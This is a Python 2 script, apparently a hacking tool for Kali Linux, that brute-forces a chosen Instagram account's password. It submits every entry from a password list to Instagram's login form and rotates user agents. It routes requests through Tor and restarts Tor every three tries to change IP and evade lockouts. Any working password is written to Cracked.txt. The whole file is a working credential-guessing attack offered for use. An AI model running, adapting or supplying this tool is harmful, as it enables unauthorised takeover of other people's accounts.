#!/usr/bin/env python
#
# @Author: ETHICAL H4CK3R
# Distro:  Kali Linux 2.0
#
# Brute Force Instagram Accounts
#
import os
import time
import socks
import socket
import random
import datetime
import mechanize
import cookielib
import subprocess

from Core.art import Colors
from Core.art import Display
from platform import platform

def SetupMechanize():
  global Br
  Br=mechanize.Browser()
  CJ=cookielib.LWPCookieJar()
  Br.set_cookiejar(CJ)
  Br.set_handle_equiv(True)
  Br.set_handle_referer(True)
  Br.set_handle_robots(False)
  Br.set_handle_refresh(True)
  Br.set_handle_redirect(True)
  Br.addheaders=[('User-agent',random.choice(Agents))]
  Br.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(), max_time=1)

def BruteForce(Email,Pass):
  try:
   Br.select_form(nr=0)
   Br.form['username']=Email
   Br.form['password']=Pass
   try:Br.submit()
   except:pass
   if Br.geturl() != Url:
    AccessGranted(Email,Pass)
  except KeyboardInterrupt:
   print'\n';Exit()

def Connect(address, timeout=None, source_address=None):
  sock=socks.socksocket()
  sock.connect(address)
  return sock

def ObtainProxyIP():
  socks.setdefaultproxy(socks.PROXY_TYPE_SOCKS5,'127.0.0.1',9050)
  socket.socket=socks.socksocket
  socket.Connect=Connect

def UserInput(Logins=[]):
  subprocess.call(['clear']);print art
  for i in range(11):print'\n'
  try:
   Email=raw_input('{}[{}-{}]{} Enter [ Email || Username ] :{} '.format(Red,Green,Red,White,Green));time.sleep(0.7)
   Passlist=raw_input('{}[{}-{}]{} Enter Passlist:{} '.format(Red,Green,Red,White,Green));time.sleep(0.7)
   return Email,Passlist
  except KeyboardInterrupt:
   print'\n';Exit()

def Exit():
  print exit0 if not found else exit1
  subprocess.call(['service','tor','stop'])
  exit()

def InstallTor():
  subprocess.call(['clear'])
  time.sleep(0.7)
  print '[!] Installing Tor ...';time.sleep(0.7);
  subprocess.call(['apt-get','update'])
  subprocess.call(['apt-get','install','tor','-y'])
  subprocess.call(['apt-get','install','--fix-missing'])

def Refresh():
  try:
   RestartTor()
   ObtainProxyIP()
   SetupMechanize()
   time.sleep(3)
  except KeyboardInterrupt:
   print'\n';Exit()

def RestartTor():
  subprocess.call(['service','tor','restart'])
  time.sleep(1)

def Message(Email):
  subprocess.call(['clear'])
  print art
  for i in range(10):print'\n'
  print '{}[{}!{}]{} Brute Force In Progress ...{}'.format(Red,Yellow,Red,Yellow,White)
  print '{}[{}-{}]{} Email: {}{}{}'.format(Red,Yellow,Red,White,Yellow,Email,White)
  print '{}[{}-{}]{} Pass:  {}{}{}'.format(Red,Yellow,Red,White,Yellow,passwrd,White)
  print '{}[{}-{}]{} Attempts: {}{}{}'.format(Red,Yellow,Red,White,Yellow,attempt,White)

def CurrentTime():
  now  = datetime.datetime.now()
  time = now.strftime("%Y-%m-%d %H:%M")
  date = time[:10]
  mins = time[-3:]
  hrs  = int(time[-5:-3])
  zone = 'am'
  if hrs > 12:
   hrs  = hrs-12
   zone = 'pm'
  return '{} {}{} {}'.format(date,hrs,mins,zone)

def AccessGranted(email,password):
  global found;found=True
  with open('Cracked.txt','a') as File:
   File.write('Username: {}\nPassword: {}\nTime Started: {}\nTime Accessed: {}\n\n'.format(email,password,TimeStarted,CurrentTime()))
  Exit()

if __name__ == '__main__':
  if os.getuid():
   exit('{}[{}!{}]{} Root Access Required'.format(Red,Yellow,Red,Blue))

  if not 'kali' in platform():
   exit('Kali Linux 2.0 required')

  Red,Blue,Green,Yellow,White=Colors[0],Colors[1],Colors[2],Colors[3],Colors[4]

  art=Display()
  Attempt,attempt,found=1,1,False
  Url='https://www.instagram.com/accounts/login/?force_classic_login'

  Agents=[( 'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.101 Safari/537.36',
	      'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/46.0.2490.80 Safari/537.36',
	      'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/46.0.2490.71 Safari/537.36',
	      'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/46.0.2490.80 Safari/537.36' )]

  if not os.path.exists('/usr/bin/tor'):InstallTor()
  from Core.Conf import ReWrite

  exit0 = '{}[{}-{}]{} Password Found: {}False'.format(Red,Yellow,Red,White,Red)
  exit1 = '{}[{}-{}]{} Password Found: {}True'.format(Red,Yellow,Red,White,Green)
  Input = UserInput()
  Email = Input[0]
  Pass  = Input[1]

  ReWrite();Refresh();Br.open(Url)
  TimeStarted=CurrentTime()
  with open(Pass,'r') as File:
   for passwrd in File:
    if not len(passwrd):continue
    try:
     passwrd = passwrd.replace('\n','')
     Message(Email)
     BruteForce(Email,passwrd)
     if Attempt==3:Refresh();Br.open(Url);Attempt=0
     Attempt+=1
     attempt+=1
    except KeyboardInterrupt:
     print'\n';Exit()
  Exit()
